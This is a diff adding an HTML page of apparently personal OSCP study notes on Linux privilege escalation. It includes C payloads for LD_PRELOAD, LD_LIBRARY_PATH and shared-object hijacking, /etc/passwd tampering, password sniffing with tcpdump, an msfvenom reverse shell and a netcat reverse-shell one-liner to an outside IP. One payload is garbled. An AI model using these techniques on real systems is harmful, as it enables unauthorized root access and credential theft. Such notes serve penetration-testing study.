@@ -1,0 +1,1116 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://thatguy9358.github.io/OSCP-Notes/Linux_Priv_Esc.html">
+      
+      
+        <link rel="prev" href="Information_Gathering.html">
+      
+      
+        <link rel="next" href="Linux_commands.html">
+      
+      
+        
+      
+      
+      <link rel="icon" href="assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
+    
+    
+      
+        <title>Linux Privilege Escalation - My site</title>
+      
+    
+    
+      <link rel="stylesheet" href="assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL(".",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="light-green" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#linux-privilege-escalation" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="index.html" title="My site" class="md-header__button md-logo" aria-label="My site" data-md-component="logo">
+      
+  <img src="assets/logo2.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            My site
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Linux Privilege Escalation
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="index.html" title="My site" class="md-nav__button md-logo" aria-label="My site" data-md-component="logo">
+      
+  <img src="assets/logo2.png" alt="logo">
+
+    </a>
+    My site
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="index.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Active_Directory.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Attacks.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Client_Side_Attacks.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Client Side Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Gotcha%27s.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Gotcha's
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Information_Gathering.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Information Gathering
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="Linux_Priv_Esc.html" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux Privilege Escalation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Linux_commands.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux Commands
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Locating_and_fixing_public_exploits.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Locating and Fixing Public Exploits
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Metasploit_Framework.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Metasploit Framework
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Mind%20Map.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Mind Map
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Note_taking_and_Report_writing.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Note Taking and Report Writing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Password_attacks.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Password Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Playbook.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Playbook
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Port_Redirecting_and_Tunneling.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Port Redirecting and Tunneling
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Recon.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Recon
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Resources.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Resources
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Vulnerability_Scanning.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Vulnerability Scanning
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Web_Application_Attacks.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Application Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Windows_Commands.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows Commands
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Windows_Priv_Esc.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows Privilege Escalation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="python_notes.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Python Notes
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<div><h1 id="linux-privilege-escalation">Linux Privilege Escalation</h1>
+<p>-
+        1. Check for binaries that have the suid bit set</p>
+<p>In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).</p>
+<p>For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.</p>
+<p>------exploiting binaries w/o full paths---</p>
+<p>Strings is a command on Linux that looks for human readable strings on a binary.</p>
+<p>This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).</p>
+<p>As this file runs as the root users privileges, we can manipulate our path gain a root shell.</p>
+<p>We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!</p>
+<h1 id="tib3rius-priv-esc-notes">Tib3rius Priv esc notes+</h1>
+<h2 id="file-permissions-and-basic-enumeration">File Permissions and Basic Enumeration</h2>
+<p>user accounts configured in /etc/passwd
+user password hashes are stored in the /etc/shadow file
+groups are configured in /etc/group
+all files and directories have a single owner and group
+directoreis
+- exuecute: directory can be entered
+- read: directory contents can be listed
+- write: files and subdirectories can be created in the directory</p>
+<p>Setuid (SUID bit): When set files get executed with privilege of owner
+Setgid: when set on a file, file will execute with privilege of the file group. When set on a directory files created in the directory will inherit the group of the directory itself</p>
+<p>permisions are 10 characters
+    1st char is - for file d for dir
+    next 9 characters are the 3 permissions for user, group, other
+    if s is set in the execute position the suid/sgid is set</p>
+<p><code>id</code> command prints user / group ids
+We can simply cat /etc/passwd to enumerate all users
+How to read /etc/passwd output
+- <strong>Login Name</strong>: "joe" - Indicates the username used for login.
+- <strong>Encrypted Password</strong>: "x" - This field typically contains the hashed version of the user's password. In this case, the value <em>x</em> means that the entire password hash is contained in the <strong>/etc/shadow</strong> file (more on that shortly).
+- <strong>UID</strong>: "1000" - Aside from the root user that has always a UID of <em>0</em>, Linux starts counting regular user IDs from 1000. This value is also called <em>real user ID</em>.
+- <strong>GID</strong>: "1000" - Represents the user's specific Group ID.
+- <strong>Comment</strong>: "joe,,," - This field generally contains a description about the user, often simply repeating username information.
+- <strong>Home Folder</strong>: "/home/joe" - Describes the user's home directory prompted upon login.
+- <strong>Login Shell</strong>: "/bin/bash" - Indicates the default interactive shell, if one exists.</p>
+<p>We can use netstat to list all listening services</p>
+<pre><code class="language-bash">netstat -anp
+</code></pre>
+<p>-a list all connections
+-n avoid hostname resolution
+-p list process name</p>
+<p>Firewall rules may be able to be read under /etc/iptables if the file permission is weak</p>
+<p>We can use <code>mount</code> to see mounted and unmounted file partitions --&gt; we may need to investigate multiple partitions for priv esc details</p>
+<h2 id="spawning-shells">Spawning shells</h2>
+<p>spawning root shell
+    one way to spawn root shell is to create a copy of the /bin/bash executable. Make sure it is owned by the root user and has the suid bit set. Then run the new executable with the -p option
+    Custom executables</p>
+<pre><code class="language-c">    int main(){
+        setuid(0);
+        system("/bin/bash -p");
+    }
+</code></pre>
+<p>The above C code will execute a bash shell running as root</p>
+<p>msfvenom can be used to generate an executable .elf file</p>
+<pre><code class="language-bash">    msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f elf &gt; shell.elf
+</code></pre>
+<p>The above code is for a reverse shell that must be caught with netcat or metasploit mutli handler
+https://github.com/mthbernardes/rsg --&gt; tool for suggesting reverse shells</p>
+<p>Linux one liner</p>
+<pre><code class="language-bash">echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.118.2 1234 &gt;/tmp/f" &gt;&gt; user_backups.sh
+</code></pre>
+<p>linux smart enumeration (lse.sh): bash script which has multiple levels
+    Link: https://github.com/diego-treitos/linux-smart-enumeration
+    several options
+    lse.sh will run with info option 0 --&gt; will only show most interesting info
+    lse.sh -l 1 will show more info</p>
+<p>LinEnum: advanced bash script which extracts useful info and can copy interesting files
+    Link: https://github.com/rebootuser/LinEnum
+     -e to set an export location
+    -k to search for keyword</p>
+<h2 id="applications">Applications</h2>
+<p>We should enumerate all installed applications and note versions. We may be able to find publicly available exploits
+dpkg or rpm should list all applications</p>
+<h2 id="kernel-exploits">Kernel exploits</h2>
+<p><code>cat /etc/issue</code> --&gt; shows OS
+<code>uname -a</code> --&gt; shows kernel version
+<code>arch</code> shows architecture type
+then you can find exploits that match kernel version
+kernel exploits can often be unstable and may be one shot or cause system to crash
+should be last resort
+linux exploit suggester 2: tool that is good at detailing vulnerable kernel exploits
+We can use keywords with searchsploit to help search for vulns</p>
+<pre><code>searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " &lt; 4.4.0" | grep -v "4.8"
+</code></pre>
+<p>Make sure we compile the exploit for the proper environment --&gt; we can check the exploit itself for any compile instructions</p>
+<h2 id="service-exploits">Service Exploits</h2>
+<p>Services are programs that run in the background, accpeting input or performing regular tasks
+If vulnerable services are running as root, exploiting them can lead to command execution as root
+Service exploits can be found with OSINT</p>
+<pre><code class="language-bash">ps aux | grep "^root"
+</code></pre>
+<p>Above command shows all services running as root
+in some instances a root process may be bound to an internal port. If an exploit cannot run locally on he target machine we can use port forwarding via ssh to run on local machine</p>
+<pre><code class="language-bash">ssh -R &lt;local-port&gt;:127.0.0.1:&lt;service-port&gt; &lt;username&gt;@&lt;local-machine&gt;
+</code></pre>
+<p>Additonally, w ecan run <code>watch -n 1 "ps aux | grep pass"</code> to watch for services configured to run with hard coded credentials</p>
+<p>We can see if we have privilege to run tcpdump and grep for passwords as well. Tcpdump is a privileged executable by default, since it needds raw sockets, but is often allowed for troubleshooting purposes</p>
+<pre><code class="language-bash">sudo tcpdump -i lo -A | grep "pass"
+</code></pre>
+<h2 id="weak-file-permisions">weak file permisions</h2>
+<p>/etc/shadow contains user password hashes. if we can read contents we can crack hashes. If we can write the file we can write hashes we know
+    crack the hash using john</p>
+<pre><code class="language-bash">john --format=&lt;hash_type&gt; --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+</code></pre>
+<p>/etc/passwd
+    if the second field of the user row contains a password hash it takes precedent over /etc/shadow. If we can write to /etc/passwd we can enter a known passwd hash for root and then use su. Alternatively we can create a new user with uid 0 because linux will allow multiple users with the same uid
+    root account is usually configured as follows
+    root:x:0:0:root:/root:/bin/bash
+    the 'x' in the second field instructs linux to look for the hash in /etc/shadow. In some versions of linux we can delete the 'x' which linux will interpret as the user having no password
+    root::0:0:root:/root:/bin/bash
+    or overwrite the x with a known hash
+we can use openssl to generate a hashed password to paste into /etc/passwd</p>
+<pre><code class="language-bash">openssl passwd &lt;password&gt;
+</code></pre>
+<p>user may have created insecure backup files
+    in /root we can look for backups
+    /var/backups
+    /tmp</p>
+<p>We can also search for all directories writable by the current user to see if anything stands out.</p>
+<pre><code class="language-bash">find / -writable -type d 2&gt;/dev/null
+</code></pre>
+<h2 id="automated-enumeration">Automated Enumeration</h2>
+<p>unix-privesc-check --&gt; installed by default on kali under /usr/bin/unix-privesc-check
+linPEAS :)
+LinEnum</p>
+<h2 id="sudo">sudo</h2>
+<p>sudo lets other users programs as root or other users
+controlled by the etc/sudoers file</p>
+<h3 id="escape-sequences">Escape sequences</h3>
+<p>sudo -l lists the programs a user can run with sudo
+if we are restricted to running certain programs as sudo we might be able to use a shell escape sequence to spawn a root shell
+https://gtfobins.github.io/ lists binaries that can be exploited to create shells
+check all commands a user can run a sudo against this resource ^^^
+AppArmor may stop some of these attempts --&gt; unsure how to check for this if not root, but it is run on Debian based systems starting with debian 10</p>
+<h3 id="abusing-intended-functionality">Abusing intended functionality</h3>
+<p>If a program doesn't have an escape sequence it may still be possible to escalate privileges
+if we can read files owned by root, we may be able to extract sensitive data. If we write to files owned by root we can insert or modify info
+apache 2 will print out an error with any line from a file it does not understand. --&gt; this allows us to read the 1st line of root owned files</p>
+<h3 id="environment-variables">environment variables</h3>
+<p>if env_keeper is set to LD_PRELOAD we can create a shared object that executes code automatically through an init() function
+it will be loaded into memory and executed before anything else</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+
+void _init(){
+    unsetenv("LD_PRELOAD");
+    setresuid(0,0,0);
+    system("/bin/bash -p");
+}
+</code></pre>
+<p>compile into shared object </p>
+<pre><code class="language-bash">gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
+</code></pre>
+<p>now if we run a valid sudo command we will get a root shell. Example if find was an approved sudo command</p>
+<pre><code class="language-bash">sudo LD_PRELOAD=/tmp/preload.so find
+</code></pre>
+<h3 id="ld_library_path">LD_LIBRARY_PATH</h3>
+<p>LD_LIBRARY_PATH variable contains a set of directories where shared libraries are searched for first
+ldd command can e used to print the shared libraries used by a program. EX:</p>
+<pre><code class="language-bash">ldd /usr/sbin/apache2
+</code></pre>
+<p>By creating a shared library with the same name as one used by a program, and setting LD_LIBRARY_PATH to its parent directory, the program will load our shared library instead</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+        unsetenv("LD_LIBRARY_PATH");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+</code></pre>
+<p>To compile, note we are hijacking libcrypt.so.1</p>
+<pre><code class="language-bash">gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+</code></pre>
+<h2 id="cron-jobs">Cron Jobs</h2>
+<p>Cron jobs are programs are scripts that run at certain times or intervals
+jobs run at the level of the user who owns them
+ususaly located in
+    /var/spool/cron
+    /var/spool/cron/crontabs
+    /etc/crontab
+    /var/log/cron.log</p>
+<p><strong>check syslog for cron jobs <code>grep "CRON" /var/log/syslog</code></strong>
+<strong>We can use the command <code>sudo crontab -l</code> to list cronjobs run by the root user</strong>
+Misconfiguration of file permisions can lead to easy priv esc if we can write to scripts or programs used by cronjob
+If any scripts are world writeable simply add in a command for a reverse shell or copy an suid version of /bin/sh</p>
+<h3 id="path-environment">Path environment</h3>
+<p>Path can be overwritten in Crontab file
+if crontab program or script does not use the absolute path, and one of the PATH directories is writeable we may be able to create program/script with the same name as the cron job</p>
+<h3 id="wildcards">wildcards</h3>
+<p>if there are any wild cards we can see create files to pass command line options
+reference gtfobins to see if commands have command line options that can lead to escape sequences</p>
+<h3 id="binary-versions">Binary versions</h3>
+<p>check versions of binaries used. Even if we cannot overwrite the binary, it may be a vulnerable version</p>
+<h2 id="suidsgid-executables">SUID/SGID Executables</h2>
+<pre><code class="language-bash">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {}\; 2&gt;/dev/null
+find  / -perm -4000 2&gt;/dev/null
+find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre>
+<p>The above command will locate files with the SUID or SGID bits set
+SUID allows a user to execute with rights of owner
+SGID allows user to execute with rights of group
+See if any of the files with suid bit have shell escape sequences on gtfobins
+LD_PRELOAD and LD_LIBRARY_PATH get ignored for SUID files
+use OSINT to look up security vulnerabilities for any unusual suid binaries
+We can also look for capabilities using the following command</p>
+<pre><code>/usr/sbin/getcap -r / 2&gt;/dev/null
+</code></pre>
+<p>capabilities are similar to having the SUID bit set
+<strong>If we have an suid binary that can edit files, we can edit root files like /etc/passwd</strong></p>
+<h2 id="shared-object-injection">shared object injection</h2>
+<p>use strace to see if any suid programs are using shared objects</p>
+<pre><code class="language-bash">strace &lt;binary&gt; 2&gt;&amp;1 | grep -iE "open|access|no such file"
+</code></pre>
+<p>the above command will report if a program is using shared objects. If output is long we can run grep to look for certain words. 2&gt;&amp;1 redirects erros to stdout so we can see those as well
+If a program is looking for a file that is currently not present we can create a malicious shared object
+creating malicious shared object
+- identify directory program is looking in for the object, confirm it's writeable
+- create a file to write the program
+    - example payload
+    ```bash
+    #include <stdio.h>
+    #include <stdlib.h></stdlib.h></stdio.h></p>
+<pre><code>static void_inject() __attribute_((constructor));
+void inject();
+    setuid(0);
+    system("/bin/bash -p");
+</code></pre>
+<pre><code>- compile file into shared objects
+```bash
+    gcc -shared -fPIC -o libcalc.so libcalc.c
+</code></pre>
+<ul>
+<li>run suid program that calls the shared object</li>
+</ul>
+<h3 id="path-environment-variable">Path Environment variable</h3>
+<p>Since a user has control ovet heir own path variable we can tell the shell to look in directories we can write to first
+If an suid binary calls another script/command that does not have an absolute path we can create a malicious one and put it under the first directory in the path variable
+run strings on executable file to find strings of characters</p>
+<pre><code class="language-bash">strings &lt;/path/to/file&gt;
+</code></pre>
+<p>look through results for anything that looks like a command
+can also use strace to confirm another program is getting called</p>
+<p>prepends current directory to PATH
+create and compile malicious executable. Example below</p>
+<pre><code class="language-c">int main(){
+    setuid(0);
+    system("/bin/bash -p");
+}
+</code></pre>
+<p>In the same command prepend current directory to path and execute suid file</p>
+<pre><code class="language-bash">PATH=.:$PATH /path/to/file
+</code></pre>
+<h3 id="bash-shell-vulnerabilities">Bash Shell Vulnerabilities</h3>
+<h2 id="finding-sensitive-info">Finding Sensitive info</h2>
+<p>Sometimes credentials may be stored in environment variables --&gt; use <code>env</code> to inspect
+if w efind any credentials we can try using them with <code>su - root</code></p></div>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": ".", "features": ["header.autohide"], "search": "assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
